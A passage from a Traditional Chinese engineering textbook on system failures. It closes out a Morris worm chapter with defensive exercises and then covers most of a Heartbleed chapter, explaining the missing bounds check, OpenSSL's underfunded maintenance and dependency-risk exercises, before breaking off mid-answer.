數）？哪個是你的「單一栽培」（讓它一次打中所有人的同質性）？你當時是怎麼止血的——有沒有 kill switch，還是像 1988 年那樣靠人手動斷？\n\n#### 推演解答\n\n（個人對帳題，無標準答案；以下是對齊框架。）你的「七分之一」通常是：probe 的 `timeoutSeconds`／`periodSeconds`、重試的次數上限或缺失的 backoff jitter、CronJob 的 schedule（多個 job 撞在整點）、爬蟲的併發度。你的「單一栽培」通常是：同一份設定推到所有實例、同一個共用 client library 的預設值、同一個下游被所有上游同時打。止血方式對照你的成熟度——理想是有 feature flag／kill switch 能即時關掉那個探測或降頻（對應 Cloudflare 的 WAF kill switch）；現實常常是「半夜被叫起來手動 scale down 或改設定重部署」（對應 1988 年的手動止血）。值得在這題誠實寫下：那個參數當初是誰設的、為什麼設成那樣、有沒有人想過它的最壞情況——通常答案是「沿用預設」或「當時覺得應該沒事」，這正是 F8 潛伏條件的生成方式。\n\n### 推演題4 [25 分鐘] ★★★\n\n**設計題**：你要上線一個新的背景掃描服務，定時對全公司數百個微服務發健康檢查並上報。在它變成「自己的 Morris 蠕蟲」之前，你會加哪幾道防線？針對每一道，說清楚它擋住因果鏈的**哪一段**，以及它的代價。\n\n#### 推演解答\n\n對照因果鏈逐段下防線：\n\n1. **退避＋抖動（backoff + jitter）**——擋「被探測對象變慢→探測更密集→踩死它」這段正回授（F7 的核心）。當目標回應變慢或失敗，自動拉長間隔而非縮短，並加隨機抖動避免所有探測撞在同一瞬間（防 thundering herd）。代價：偵測延遲變大，目標真的死了你會晚一點知道。\n2. **總流量上限／速率護欄**——擋「頻率 × 併發 × 失敗放大」的乘積失控（對應那個七分之一）。對整個掃描服務設一個全域的每秒請求上限，無論有多少目標、重試多少次都不突破。代價：目標很多時，單一目標的探測頻率被迫降低。\n3. **circuit breaker**——擋級聯擴散。某個目標連續失敗就暫時停止探測它（開路），給它喘息，過一陣子再半開試探。代價：開路期間你對那個目標完全沒有可觀測性——要權衡「別踩它」與「別瞎」。\n4. **kill switch（feature flag）**——這是 1988 年最缺的那一道。一個能在數秒內全域關掉整個掃描、或把頻率歸零的開關，不需要重新部署。擋的是「災難已經發生、要止血」這段——把「半夜手動斷網」變成「點一下」。代價：幾乎沒有，這是性價比最高的一道（呼應 ch22）。\n5. **金絲雀／分批推送設定**——擋單一栽培放大（F14）。掃描頻率／規則的任何變更，先推一小批、觀察、再全推，不要一次把新設定送到所有掃描節點。代價：變更生效變慢。\n\n一句總結：Morris 缺的是第 2 道（那個七分之一沒有上限）和第 4 道（沒有 kill switch），而 F14 讓缺這兩道的後果放大到全網。你的掃描服務只要這五道齊全，同樣的形狀就只會「安全地壞」。\n\n## 自我檢核\n\n口頭自答，講得出來才算過關：\n\n1. 為什麼說這場災難的觸發是「一個機率參數」而不是「一個漏洞」？緩衝區溢位在因果鏈裡扮演什麼角色（潛伏 vs 觸發）？\n2. 那個七分之一的重感染率，當初是為了解決什麼問題而加的？為什麼一個**防禦性**的設計反而成了災難的直接成因（這對應哪個 F 模式）？\n3. 如果 1988 年的網際網路是異質的（多種作業系統），這場災難的規模會怎麼變？這說明 F14 單一栽培是「進門的方式」「扣扳機的東西」還是「放大器」？\n4. 列出至少四道存在的防禦層，並說出每一道**為什麼沒擋住**。為什麼把這場災難歸給「fingerd 緩衝區溢位」是錯的問法？\n5. Morris 蠕蟲的「自我放大」和 ch10 Cloudflare regex 的「同步放大」差在哪？兩者的共同 blast radius 機制是什麼？\n6. 為什麼說「無傷亡、無破壞 payload」反而讓這場災難更值得後端工程師警惕，而不是更不值得？\n7. 你系統裡哪一個背景程式（probe／retry／scan／crawler）的頻率或併發參數，是你的「七分之一」？它的最壞情況流量你算過嗎？\n8. 你有沒有一個能在數秒內關掉某個自動探測／重試的 kill switch？如果沒有，下次它失控時你的止血方式是不是就是 1988 年的「手動斷」？\n\n## 延伸閱讀\n\n- **Eugene H. Spafford, \"The Internet Worm Program: An Analysis\"（Purdue Tech Report CSD-TR-823, 1988）** — 最權威的逐段剖析，確認蠕蟲不含破壞性 payload、災難來自重複感染。要看「七分之一」與行程爆量的第一手分析就讀這篇。https://spaf.cerias.purdue.edu/tech-reps/823.pdf\n- **Mark Eichin & Jon Rochlis, \"With Microscope and Tweezers: An Analysis of the Internet Virus of November 1988\"（MIT, 1989）** — 從 MIT 角度的逆向分析與當夜止血紀實，與 Spafford 互補。https://dl.acm.org/doi/10.1145/63526.63528\n- **United States v. Morris, 928 F.2d 504（2d Cir. 1991）** — CFAA 首例定罪的上訴判決全文，看法律體系第一次嘗試定義「未授權存取」的邊界。\n- **CERT/CC 與 SEI 的成立沿革（Carnegie Mellon SEI）** — 看一場「沒人知道該打給誰」的事件如何催生了今天整套資安應變體系。https://www.sei.cmu.edu/about/history-of-innovation-at-the-sei/\n- **FBI, \"The Morris Worm — 30 Years Since the First Major Attack on the Internet\"（2018）** — 事件當晚氛圍與後續影響的可讀概覽。https://www.fbi.gov/news/stories/morris-worm-30-years-since-first-major-attack-on-internet-110218\n"}, {"id": "ch19-heartbleed", "file": "ch19-heartbleed.md", "group": "Part VI — 看不見的縫：安全、供應鏈與靜默損毀", "title": "ch19 — Heartbleed：兩年沒人發現的一個缺漏邊界檢查", "md": "# ch19 — Heartbleed：兩年沒人發現的一個缺漏邊界檢查\n\n> **本章解剖什麼**：OpenSSL 在實作 TLS 的「心跳」（heartbeat）擴充時，相信了攻擊者宣告的長度欄位，卻從沒去比對「你宣告要回傳這麼多，可是你實際送來的 payload 有這麼多嗎」。少了這一行邊界檢查，伺服器會把緩衝區之後緊鄰的最多約 64 KB 行程記憶體一併回傳——裡頭可能就躺著私鑰、密碼、session cookie。這個缺陷 2012 年隨 OpenSSL 1.0.1 出貨，潛伏逾兩年沒人發現（F8），影響全球大半 HTTPS 伺服器（F14），而它最深的根因不在那一行 C 程式，而在組織面：撐起全網信任地基的 OpenSSL，當年只靠約四名開發者、其中僅一人全職、年捐款約兩千美元在維護（F14 單一栽培＋資源不足）。它和 Schiaparelli（見 ch08）是同一個家族——少了一行合理性／邊界檢查，整條鏈就鎖死——只是這次沒人死、卻要全世界輪換金鑰與憑證。它也預告了 ch20：你的信任邊界，其實延伸到每一個你 import、卻沒人在顧的東西。\n\n## 從你已知的出發\n\n你維運的服務跑在 AWS、ECS、Lambda 上，對外的每一條連線都是 TLS。使用者打到你的 ALB、你的服務之間互打、你連 RDS 連 S3——這些「s」全靠同一套東西在撐：一個會做 handshake、驗憑證、協商金鑰、把流量加密的密碼學函式庫。十之八九，那個函式庫的根，是 OpenSSL（或它的分支 BoringSSL/LibreSSL，但血緣都從這裡來）。它是你整個服務信任鏈的地基，地基的地基。你大概從來沒讀過它一行原始碼，也不需要——它「就在那裡」，跟空氣一樣。\n\n現在停一下，誠實回答一個問題：這塊地基，是誰在顧？\n\n如果你的直覺是「這麼重要的東西，總有個大公司、或一個資源充足的團隊在維護吧」——記住這個直覺，因為這就是本章要拆穿的那句**「應該沒事吧」**：一個被全世界用的相依，必然被好好維護。聽起來天經地義，對吧？用的人越多，盯的眼睛越多，bug 越快被抓到，Linus 定律（\"given enough eyeballs, all bugs are shallow\"）不是這樣講的嗎？\n\n2014 年 4 月，這個直覺被砸碎了。撐起全球大半 HTTPS 的 OpenSSL，當時的維護團隊是**約四個人，其中只有一個全職**，靠**一年約兩千美元**的捐款在養。一個攻擊者可控的長度欄位，少了一行邊界檢查，潛伏了兩年多沒人發現。等到有人發現，全世界才驚覺：原來我們把信任的地基，蓋在幾個志工的業餘時間上。\n\n我們來看這道縫是怎麼開的——以及為什麼它能開兩年。\n\n## 冷開場：2014 年 4 月 7 日，一場同時被兩邊發現的洩漏\n\n2014 年 4 月初，兩組人馬幾乎同時、各自獨立地，盯上了 OpenSSL 裡同一段程式碼。一邊是 Google 安全團隊的 Neel Mehta，另一邊是芬蘭資安公司 Codenomicon 的研究員。Google 的人先把問題回報給 OpenSSL 專案；Codenomicon 的人則做了一件影響深遠的事——他們給這個 bug 取了名字、做了 logo、註冊了 `heartbleed.com`。\n\n這在當時不是慣例。多數 CVE 只有一個冷冰冰的編號（這個的編號是 **CVE-2014-0160**）。但 Codenomicon 直覺到這個東西的嚴重程度需要讓非技術的人也聽得懂——於是「Heartbleed（心淌血）」這個名字、那顆滴血的紅心，幾天內傳遍全世界的新聞頭條。一般人第一次因為一個 OpenSSL bug 而被叫去改密碼。\n\n4 月 7 日，OpenSSL 發布安全公告與修補版本 **1.0.1g**，同一天揭露漏洞。然後全世界的維運人員開始了一個漫長的週末：升級 OpenSSL、重啟服務、**重新產生私鑰、重新簽發憑證、撤銷舊憑證、強制使用者改密碼**。CloudFlare 一家就撤銷並重新簽發了**逾十萬張憑證**。\n\n為什麼一個「讀記憶體」的 bug，要勞動全世界輪換金鑰？因為這個 bug 洩的，可能正是金鑰本身。\n\n## 裝填：心跳是什麼，縫埋在哪\n\n要看懂這場災難，先得知道在那行缺失的檢查存在之前，有哪些孔洞早就安靜對齊在那裡。它們每一個單獨看都不離譜，這正是 F8（潛伏條件）的特徵——災難早就裝填完畢，只等有人按下觸發。\n\n**先講心跳本身。** TLS（還有它的 UDP 版 DTLS）有一個叫 **heartbeat** 的擴充功能（定義在 RFC 6520）。它的用途很無辜：一條加密連線如果一陣子沒流量，雙方想確認「你還在嗎」，又不想付出重新 handshake 的代價，就送一個心跳請求。協定設計成這樣：請求方送出一個 **payload**（一段任意資料）加上一個 **payload_length**（宣告「我這段 payload 有多長」），對方收到後，把同樣的 payload 原封不動回送回來。就像 ping——你丟一句話過去，對方把同一句話喊回來，證明連線還活著。\n\n聽起來人畜無害。問題出在「對方怎麼知道要回送多少 bytes」。\n\n**潛伏條件一：伺服器選擇相信攻擊者宣告的長度。** OpenSSL 的伺服器端收到心跳請求後，要組一個回應封包，把 payload 抄回去。它抄多少？它讀請求裡那個 `payload_length` 欄位——也就是**請求方自己宣告的數字**——然後照這個數字，從記憶體裡複製這麼多 bytes 出來回送。用 C 的話講，大致就是一個 `memcpy`，長度參數直接吃了對方給的 `payload_length`。\n\n這是整起事件的核心縫。`payload_length` 是**攻擊者完全可控的輸入**。伺服器把它當成可信的事實，照單全收。\n\n**潛伏條件二：沒有人比對「宣告長度」和「實際長度」。** 一個誠實的心跳請求，宣告的 `payload_length` 應該等於它實際附上的 payload 大小。但協定本身、以及 OpenSSL 的實作，都**沒有強制這兩者相符**。攻擊者大可以送一個只有 1 byte 的 payload，卻在 `payload_length` 欄位填上 **65535（約 64 KB）**。伺服器不會起疑——它只看那個宣告的數字，然後忠實地從記憶體複製 64 KB 回送。\n\n那多出來的、攻擊者根本沒送過來的 6 萬多個 bytes，從哪來？從那個 payload 緩衝區**之後緊鄰的行程記憶體**來。這就是 **buffer over-read（緩衝區越界讀取）**——不是寫壞記憶體，是**讀了不該讀的記憶體**。而一個處理 TLS 的行程，它的記憶體裡有什麼？剛剛別的使用者送來的密碼、session cookie、HTTP 請求內容——還有，運氣夠好的話，**伺服器自己的私鑰**。\n\n**潛伏條件三：C 的手動記憶體管理沒有任何安全網。** 這段程式碼跑在 C 裡。沒有邊界檢查、沒有記憶體安全保證、沒有 ASAN 之類的工具在 production 盯著。一個越界讀取在 C 裡是**靜默成功**的——它不會 crash，不會丟例外，不會在 log 裡留下半個字。程式高高興興地把鄰居的記憶體當成自己的 payload 回送出去，一切「正常」。\n\n**潛伏條件四，也是最深的一條：沒人有空盯這段碼。** 這道縫不是天上掉下來的。漏洞由開發者 Robin Seggelmann 在 **2011 年 12 月 31 日**（跨年夜）提交，審查者是 OpenSSL 的核心維護者 Stephen Henson。提交經過了 code review——**然後 review 沒抓到。** 這不是因為他們蠢。是因為這是個人畜無害的新功能、在跨年夜、由一個資源極度稀薄的團隊在審。記住 review 也是一層起司，這層起司那天也有洞。\n\n這四個孔洞平時錯開、相安無事。它們安靜地等著，等了**兩年多**。\n\n## 觸發：其實沒有「那根稻草」——這才是最可怕的地方\n\n前面每一章的「觸發」段，總有一根明確的稻草：一次部署、一個飽和的感測器、一通電話、一次寒潮。Heartbleed 不一樣。它的觸發段，恐怖之處在於**沒有觸發事件**。\n\n這個漏洞 2012 年 3 月隨 OpenSSL 1.0.1 出貨。從那一刻起，它就**一直可以被觸發**。任何人，對任何一台跑著 1.0.1 到 1.0.1f 的伺服器，送一個說謊的心跳請求，就能抽走 64 KB 記憶體。不需要登入、不需要特權、不需要任何前置條件。而且——**不留任何日誌痕跡**。一個正常的心跳請求和一個惡意的心跳請求，在伺服器看來幾乎沒有區別，它不會記錄「有人讀走了我的記憶體」。\n\n所以這兩年裡，到底有沒有人在利用它？**沒有人能確定。** 這正是「不留痕跡」最毒的地方：你無法回頭去 log 裡查「我們被讀過嗎」。揭露之後，全世界只能假設**最壞情況**——凡是跑過脆弱版本的伺服器，私鑰都可能已經外洩，所以全部都得當作已洩漏來處理。輪換金鑰不是因為「確定被偷了」，是因為**你永遠無法證明沒被偷**。\n\n如果說有什麼算是觸發，那就是 2014 年 4 月 7 日的「揭露」本身——但揭露不是漏洞被啟用的時刻，是**漏洞終於被看見**的時刻。它已經在那裡開了兩年。\n\n## 連鎖：從一個說謊的長度，到全世界輪換金鑰\n\n孔洞一個接一個被穿透。注意這條鏈和前面物理災難的差別——這裡的「連鎖」不是幾秒內的級聯，是一場以「兩年潛伏＋一次揭露＋全球同時應對」展開的慢動作雪崩。\n\n**第一步，攻擊者送出說謊的心跳。** payload 給 1 byte，`payload_length` 宣告 64 KB。\n\n**第二步，伺服器照宣告長度 memcpy，越界讀取。** 沒有任何一行檢查擋下「宣告 64 KB、實際只有 1 byte」這個矛盾。`memcpy` 從 payload 緩衝區之後一路複製 64 KB。\n\n**第三步，鄰近記憶體被當成 payload 回送。** 那 64 KB 裡是什麼，是運氣——可能是別人的 HTTP 請求、session cookie、明文密碼，也可能是私鑰的片段。攻擊者收下，分析，然後**再送一個心跳，再抽 64 KB**。一次抽一點點，反覆抽，像用吸管一口一口吸乾一杯水。\n\n**第四步，私鑰真的能被拼出來——這不是理論。** 揭露後幾天，CloudFlare 公開懸賞，問「真的能靠 Heartbleed 抽到伺服器私鑰嗎」——這在當時還被一些人認為是理論上的最壞情況、未必做得到。結果：**四名研究員各自獨立地、在十小時內就把私鑰抽出來了**。手法是反覆抽記憶體、在抽到的碎片裡找出 RSA 公鑰的質因數，再用兩個質因數反推私鑰。最壞情況被證實是真的。\n\n**第五步，blast radius 撐開到全網。** 揭露當下的測量：約 **17%**（**約五十萬台**）受信任憑證機構認證的 HTTPS 伺服器，跑著脆弱版本的 OpenSSL。OpenSSL 不是某家公司的私有產品——它是無數系統共用的同一塊地基。所以這不是「一家公司中招」，是**同一個缺陷同時躺在半個網際網路底下**。這就是 F14（單一栽培／規模放大）：同質化＋規模，讓單點缺陷一次打中所有人。\n\n**第六步，全球進入「假設一切已洩漏」的善後。** 因為無法證明沒被讀過，正確的應對是把所有脆弱伺服器的祕密**全部當作已外洩**：升級 OpenSSL 到 1.0.1g、重新產生私鑰、重新簽發並撤銷舊憑證、要使用者改密碼。CloudFlare 一家撤換逾十萬張憑證；全世界的維運團隊那個四月都在做同一件苦工。修補本身極簡單——1.0.1g 只是加上一行檢查：**如果宣告長度對不上實際 payload，就直接忽略這個心跳。** 一行。和 bug 一樣輕——一個少了，一場災難；一個補上，全部結束。\n\n## 餘波：地基是誰在顧\n\n技術上的故事到 1.0.1g 就講完了。但 Heartbleed 真正的遺產，不是那一行 `memcpy`，是它逼著全世界回答冷開場那個問題：**這塊地基，是誰在顧？**\n\n答案讓人坐立難安。OpenSSL Software Foundation 的共同創辦人 Steve Marquess 在事後透露：OpenSSL 的核心開發者**約四個人，其中只有一個是全職**；專案一年收到的捐款**約兩千美元**。撐起全球大半 HTTPS 加密的這套程式，維護它的資源，少於很多人一個月的薪水。Marquess 說，這個專案至少該有**半打全職人手**，而不是一個。Heartbleed 之後捐款湧入，但也只湊到約九千美元——對於它扛的責任，仍是杯水車薪。\n\n這就是開源世界的**公地悲劇（tragedy of the commons）**：一個東西被所有人使用、卻不屬於任何人，於是每個人都假設「別人會顧」，結果沒人真的在付錢養。用的人成千上萬，付錢／投人力的趨近於零。Linus 定律的前提是「足夠多的眼睛」——但 Heartbleed 證明，**「被很多人用」不等於「被很多人看」**。大家都在用，幾乎沒人在讀那段 C。\n\n這場事故催生了它最重要的制度遺產：**Core Infrastructure Initiative（CII，核心基礎設施倡議）**，2014 年 4 月底由 Linux Foundation 牽頭成立。Amazon、Cisco、Dell、Facebook、Google、IBM、Intel、Microsoft 等科技巨頭各出資（多家各約十萬美元），湊出**約四百萬美元的基金**，專門去資助那些「全世界都依賴、卻長期被忽視、資源不足」的關鍵開源專案。OpenSSL 是第一批受助對象之一——CII 出錢讓它有了**兩名全職開發者**，並資助對 OpenSSL 的安全稽核。NTP、OpenSSH 等同樣脆弱的「無名地基」也陸續進了名單。\n\n注意這個結構：**沒有一條結論是「Seggelmann 寫錯了一行 C」。** 那行確實漏了檢查，review 確實沒抓到——但把這場災難講成「某個工程師的疏失」，就錯失了全部的教訓。真正的根因是系統性的：一個關鍵到不能再關鍵的東西，被丟給幾個志工用業餘時間維護，沒有資源做嚴格的審查、測試與稽核。CII 修的不是那行 code，是**那個讓那行 code 能潛伏兩年的組織條件**。\n\n## 故障解剖\n\n### 潛伏條件 vs 觸發\n\n| | 內容 |\n|---|---|\n| **潛伏條件（早就裝填好）** | (1) heartbeat 實作相信攻擊者宣告的 `payload_length`、照它 memcpy；(2) 沒有任何一處比對「宣告長度 vs 實際 payload 長度」；(3) C 的手動記憶體管理＋無記憶體安全防護，使越界讀取靜默成功、不 crash 不留 log；(4) **組織面**：OpenSSL 僅約四人、一名全職、年捐款約兩千美元在維護，code review 那層起司也因此有洞——這條是本案最深的潛伏條件。 |\n| **觸發（最後一根稻草）** | **沒有傳統意義的觸發事件。** 漏洞 2012-03 隨 1.0.1 出貨後就一直可被任意人遠端觸發、不留痕跡，潛伏逾兩年。唯一算得上「事件」的是 2014-04-07 的揭露——但那是它被**看見**的時刻，不是被**啟用**的時刻。 |\n\n關鍵在於：和前幾章不同，Heartbleed 沒有「那天恰好對齊」的戲劇性瞬間。它從出貨第一天就完整裝填、隨時可觸發。它教的不是「孔洞如何在某一刻對齊」，而是**「一個沒人盯的孔洞可以開多久而沒人發現」**——以及為什麼「不留痕跡」讓你連「有沒有出事」都查不出來。\n\n### 起司的孔洞：每一層為什麼都沒擋住\n\n```\n一個說謊的長度的旅程：從一個欄位到全球輪換金鑰\n（每一段 ↓ 旁邊是「本該擋住卻沒擋住」的那層起司）\n\n  攻擊者送心跳：payload=1 byte，宣告 payload_length=64 KB\n    ↓   孔洞1：伺服器相信攻擊者宣告的長度（沒擋住）\n  照宣告長度 memcpy\n    ↓   孔洞2：無「宣告長度 vs 實際長度」的邊界檢查（沒擋住）\n  讀到 payload 緩衝區之後的鄰近記憶體\n    ↓   孔洞3：C 無記憶體安全、越界讀取靜默成功（沒擋住）\n  64 KB 鄰近記憶體被當 payload 回送（含私鑰/密碼/cookie）\n    ↓   孔洞4：不留日誌，無法事後得知是否被讀（沒擋住）\n  反覆抽取 → 拼出私鑰\n    ↓   孔洞5：同一缺陷躺在約 50 萬台伺服器底下（沒擋住）\n  全球同時暴露 → 假設一切已洩漏\n    ↓\n  輪換金鑰、重簽憑證、改密碼（全世界的苦工）\n\n  ── 而這一切能潛伏兩年，因為： ──\n  孔洞0（最深）：關鍵基礎設施由約 4 人、1 全職、年捐 ~$2,000 維護\n                → code review 這層起司本身就缺人缺錢\n```\n\n| 防禦層 | 它本該擋住什麼 | 為什麼沒擋住 |\n|---|---|---|\n| 輸入驗證（邊界檢查） | 拒絕「宣告長度 ≠ 實際 payload」的矛盾請求 | **這層從來不存在**——直接信任攻擊者宣告的 `payload_length` 去 memcpy |\n| 記憶體安全 | 讓越界讀取 crash/報錯而非靜默成功 | C 手動記憶體管理、無 ASAN/邊界保護，越界讀取無聲通過 |\n| Code review | 在合併前抓到缺失的長度比對 | review 有做，但團隊資源極稀薄、新功能看似無害，那天這層起司有洞 |\n| 可觀測性／稽核 | 偵測到異常的記憶體讀取行為 | 漏洞不留日誌痕跡，事後連「是否被利用」都無法查證 |\n| 多樣性（避免單一栽培） | 讓單一缺陷不會一次打中所有人 | OpenSSL 是全網共用的同一塊地基，約 50 萬台同時脆弱（F14） |\n| 組織資源 | 投入足夠人力做嚴格審查、測試、稽核 | 全球依賴、年捐約兩千美元、僅一名全職維護者（公地悲劇） |\n\n明確反駁「單一根因」：你可以說根因是「少了一行邊界檢查」——但那行少了兩年沒人補，是因為沒人有資源去補、去審、去測。你可以說是「Seggelmann 寫錯了」——但 review 通過了、出貨了、跑了兩年，這不是一個人的失誤，是一整排防禦同時稀薄。真相是這幾層**每一層都有自己沒擋住的理由**，而最底下那層（孔洞0：沒人有空有錢顧）讓上面所有層都先天孱弱。補上任何一層——一行檢查、用記憶體安全語言、足夠的稽核資源——這個 bug 都不會活兩年。\n\n### 對應的失敗模式\n\n- **F9（介面與假設的縫）**：核心。heartbeat 協定的契約假設「宣告長度 = 實際 payload 長度」，但實作從不強制這個假設。攻擊者宣告的長度與實際送來的資料之間那道沒人守的縫，正是這場災難的入口。和 Schiaparelli 把飽和值當真（見 ch08）、和金姆利把磅當成公斤（見 ch07）是同一個病：兩邊對「這個數字代表什麼」的假設不一致，而中間沒有一層去裁決。\n- **F8（潛伏條件 vs 觸發）**：缺失的邊界檢查、靜默的越界讀取、稀薄的 review——三個孔洞 2012 年就裝填好。沒有戲劇性觸發，它從出貨日就隨時可被啟用，潛伏逾兩年。本案是 F8 的極端形式：**潛伏期由「沒人盯」直接決定。**\n- **F14（規模放大／單一栽培）**：核心。OpenSSL 的無所不在，讓一個缺陷一次躺進約 50 萬台伺服器底下。同質化＋規模＝單點打中所有人。這也是「孔洞0」的另一面——正因為大家都用同一塊地基，「該由誰維護」反而沒人扛。\n- **F3（起司孔洞對齊）**：輸入驗證、記憶體安全、code review、稽核——這幾層防禦各有洞，平時靠「大概沒人會利用」僥倖錯開，揭露那天全部連成一線。沒有任何單一一層失效足以致災；是它們一起。\n\n### 一句話形狀\n\n**這場災難的形狀是：一個全世界都當成空氣在用、卻只有幾個志工用業餘時間在顧的信任地基，因為少了一行「你宣告的長度跟你實際送的對得上嗎」的邊界檢查，讓任何人都能無聲地一口一口吸走伺服器的記憶體——包括金鑰本身——而這個缺口能開兩年沒人發現，正是因為「大家都在用」從來不等於「有人在看」。**\n\n## 換成你的系統\n\n兩個層次，兩個你「應該沒事吧」的假設，都點名給你。\n\n**第一層，技術的：你信任了上游宣告的長度／大小／數量，卻沒比對它跟實際內容。** 這個形狀你比想像中更熟。你解析一個 protobuf／一個自訂 binary 協定／一個 multipart upload，header 裡寫著「接下來這段是 N bytes」，你照 N 去讀／去配置緩衝區——你有沒有比對「實際真的有 N bytes 嗎」？你從 SQS 收一則訊息，裡頭一個欄位宣告「這個 batch 有 1000 筆」，你照 1000 去跑迴圈——實際陣列真的有 1000 筆，還是只有 3 筆而你讀過了界？Heartbleed 的核心不是「TLS 很難」，是**「相信對方宣告的 metadata，而不去對照實際的 payload」**——這是個跨語言、跨協定的反模式，和 Schiaparelli 把飽和值當真（見 ch08）、本書反覆出現的「缺一個 sanity／bounds check」是同一張臉。你天天在做的事裡，有幾處是「照 header 說的長度去動作，沒驗實際長度」？\n\n**第二層，組織的，也是本章真正要你帶走的：你的關鍵相依裡，有哪些是「全世界都在用、其實沒人在顧」的單點？你的 SBOM 知道嗎？** 你 `npm install` 一個套件，它再 `dependencies` 一串你沒聽過的東西，那些東西又依賴更深的東西。你的服務最終跑在一棵幾百上千個節點的相依樹上，而其中**最關鍵的那幾個葉子，可能正是某個維護者在週末用愛發電的專案**。你預設它「被很多人用，所以很穩、很安全」——這就是 Heartbleed 砸碎的那個直覺：**「廣泛使用」是流行度，不是維護品質的保證。** 一個被一千萬個專案依賴、卻只有一個累壞的維護者的套件，不是「很安全」，是「一個極大的、沒人在顧的單點」（這條線延伸到供應鏈攻擊，見 ch20）。\n\n焦慮工程師的版本，命名那個具體的未處理失敗案例：你的 production 此刻正信任著至少一個你叫不出名字、不知道誰在維護、上次安全稽核是什麼時候的相依。它平時沉默，因為還沒人去戳它。它出事的那天，會是某個你管不到的志工、在某個你沒讀過的檔案裡、漏了某一行檢查的那天——而你會跟 2014 年四月全世界的維運一樣，被迫假設「一切都已洩漏」，然後輪換你以為很安全的每一把鑰匙。\n\n可操作的自問，不是「要關注供應鏈」這種廢話，是這三條具體的：\n\n1. **你有 SBOM 嗎？** 你能不能在五分鐘內列出「我的服務直接與間接依賴了哪些套件、各是哪個版本」？如果不能，下一個 Heartbleed／Log4Shell（見 ch20）來的時候，你連「我中不中招」都答不出來——而那一天，分秒必爭。\n2. **你的相依樹裡，最關鍵的三個是誰在維護？** 挑出「掛了你服務就掛」的那幾個（密碼學庫、序列化庫、你的 web framework 核心），去查：幾個維護者？多久沒更新？有沒有金主／基金會在後面？如果答案是「一個人、業餘、零資金」，你就找到了一個 Heartbleed 形狀的單點。\n3. **你怎麼比對「宣告的長度」和「實際的內容」？** 在你自己解析外部輸入的每一處——header 宣告的 size、訊息宣告的 count、協定宣告的長度——你有沒有那一行「宣告值必須對得上實際值，否則拒絕」的檢查？還是你跟 2011 年那次 review 一樣，因為「這欄位應該不會說謊吧」就放它過去了？\n\n## 紙上推演\n\n### 推演題1 — 口頭重講：為什麼一個 missing bounds check 能潛伏兩年 **[15 分鐘] ★★**\n\n不看書，向一個沒聽過這案子的工程師，用三分鐘講清楚兩件事：(a) 技術上，Heartbleed 是怎麼從「一個說謊的心跳請求」變成「讀走伺服器私鑰」的——必須講到「宣告長度 vs 實際長度」「越界讀取」「不留日誌」三個環節；(b) 為什麼這個缺陷能潛伏**逾兩年**沒被發現——而這個答案**不能**是「沒人夠聰明」。\n\n#### 推演解答\n\n(a) 合格的技術講述：心跳協定讓你送一段 payload＋宣告它多長，伺服器把同樣的 payload 回送。OpenSSL 相信你**宣告**的長度，照它 memcpy 回送，卻沒檢查你**實際**送了多少。攻擊者送 1 byte 卻宣告 64 KB，伺服器就把 payload 緩衝區之後的 64 KB 鄰近記憶體（可能含私鑰、密碼、cookie）一併回送——這是越界**讀取**（不是寫壞），在 C 裡靜默成功、不 crash、不留 log，所以可反覆抽取且無法事後查證。\n\n(b) 合格的「為什麼潛伏兩年」答案必須落在**組織與系統條件**，不是個人能力：這段碼跑在一個**約四人、僅一人全職、年捐約兩千美元**的專案上；review 確實做了，但團隊資源稀薄、這又是個看似無害的新功能；漏洞**不留痕跡**，所以即使被利用過也不會浮現成「事故」去引人注意。換句話說——它能潛伏兩年，不是因為它藏得多巧，是因為**幾乎沒人有資源、有動機、有工具去盯它**。如果你的版本是「就是沒人發現而已」，你就漏掉了本章最重要的一層：「被很多人用」從不等於「被很多人看」（Linus 定律的前提沒被滿足）。\n\n### 推演題2 — 反事實：補上不同的那層起司 **[20 分鐘] ★★**\n\n考慮三個獨立的「假如」，分別問它能不能阻止 Heartbleed、以及它擋住／沒擋住哪些孔洞：(甲) 假如 heartbeat 實作裡有那一行邊界檢查（宣告長度必須對上實際 payload，否則忽略）；(乙) 假如 OpenSSL 是用記憶體安全的語言（如 Rust）寫的，越界讀取會 panic 而非靜默成功；(丙) 假如 OpenSSL 一直有 CII 那種等級的資源（半打全職人手＋定期安全稽核），但那行 code 還是照原樣寫出來了。哪一個最徹底？三者各對應修補哪一個孔洞？\n\n#### 推演解答\n\n(甲) 邊界檢查：直接堵死孔洞1、2。攻擊者宣告 64 KB 卻只送 1 byte，會被當成矛盾請求忽略，沒有越界讀取——這就是 1.0.1g 實際做的修補，一行解決。它擋住了這個**具體**的 bug，但沒改變「C 沒有記憶體安全」「下一個 memcpy 還可能漏檢」的體質。\n\n(乙) 記憶體安全語言：補的是孔洞3。越界讀取會在執行期 panic／報錯，而非靜默回送鄰居記憶體——所以即使有人漏了那行檢查，傷害也會是「crash」而非「無聲洩漏私鑰」。這比 (甲) **更治本**，因為它把整**類**「越界讀取靜默成功」的 bug 變成可見的失敗（這正是近年用 Rust 重寫關鍵基礎設施的論據之一）。但它換來的是另一種失敗模式（panic = 可用性問題），且無法防住邏輯層的錯誤。\n\n(丙) 資源充足：補的是孔洞0。但注意——**它不保證那行 bug 不被寫出來**，人會犯錯與資源無關。它改變的是 bug **被發現與修補的速度**：定期稽核、足夠的 review 眼睛、模糊測試（fuzzing），讓這個缺陷不可能潛伏兩年——很可能幾週、幾個月內就被抓到，blast radius 小得多。\n\n最徹底的是**疊加**，而非單選：CII（丙）讓 fuzzing 與稽核更可能在出貨前抓到它；記憶體安全（乙）讓即使漏抓也不會靜默洩漏；邊界檢查（甲）是當下最便宜的止血。這正是瑞士起司的精神——你不需要補上每一層，但每多補一層，這個缺口能造成的傷害就指數下降。而本章的重點是：(丙) 是大家最容易忽略、卻決定「能潛伏多久」的那一層。\n\n### 推演題3 — 對帳你自己的相依：找出你的 Heartbleed 形狀單點 **[30 分鐘] ★★★**\n\n挑一個你實際維運的服務，做兩件事。(a) 試著產出（或盤點）它的相依清單——直接相依先列，能列出間接相依更好。(b) 從中挑出三個「掛了你服務就掛」的關鍵相依，對每一個查證：幾個活躍維護者？多久沒發版？背後有沒有公司／基金會在養？最近一次安全稽核（如果查得到）是什麼時候？然後評估：哪一個最像 Heartbleed 形狀的「全世界都用、其實沒人在顧」的單點？對那一個，你能採取的具體降風險動作是什麼？\n\n#### 推演解答\n\n這題沒有標準答案，但有合格標準。不合格的版本是「我應該多注意供應鏈」——那是焦慮不是工程。合格的對帳必須具體到「哪個套件、誰維護、什麼風險、做什麼」。一個夠好的例子長這樣：\n\n「我的 NestJS 服務直接依賴約 40 